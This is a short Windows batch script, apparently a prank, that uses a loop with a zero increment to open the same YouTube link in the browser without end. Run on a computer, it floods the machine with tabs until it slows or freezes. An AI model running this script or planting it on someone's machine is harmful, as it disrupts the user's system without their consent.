:: Loops forever because the increment is 0
for /l %%x in (1,0,2) do (
   start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ" ""
)
